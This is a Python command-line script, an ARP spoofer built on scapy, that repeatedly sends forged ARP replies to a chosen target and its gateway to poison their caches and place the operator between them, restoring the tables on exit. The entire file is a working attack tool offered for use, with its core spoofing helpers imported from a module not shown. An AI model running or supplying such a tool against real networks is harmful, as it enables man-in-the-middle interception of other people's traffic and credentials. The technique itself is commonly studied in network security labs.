#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time
import sys
from utils import get_mac, spoof, restore

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofer - Poison target and gateway ARP caches")
    parser.add_argument(
        "-t", "--target",
        dest="target_ip",
        required=True,
        help="Target IP address to poison"
    )
    parser.add_argument(
        "-g", "--gateway",
        dest="gateway_ip",
        required=True,
        help="Gateway (router) IP address"
    )
    parser.add_argument(
        "-i", "--iface",
        dest="iface",
        default=None,
        help="Network interface to use (e.g., eth0). Leave empty for default."
    )
    args = parser.parse_args()

    if args.iface:
        scapy.conf.iface = args.iface

    target_ip = args.target_ip
    gateway_ip = args.gateway_ip

    print(f"[+] Starting ARP spoofing between {target_ip} and {gateway_ip}")
    print("[*] Press CTRL+C to stop and restore network...")

    packet_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packet_count += 2
            print(f"\r[+] Packets sent: {packet_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C, restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] ARP tables restored. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
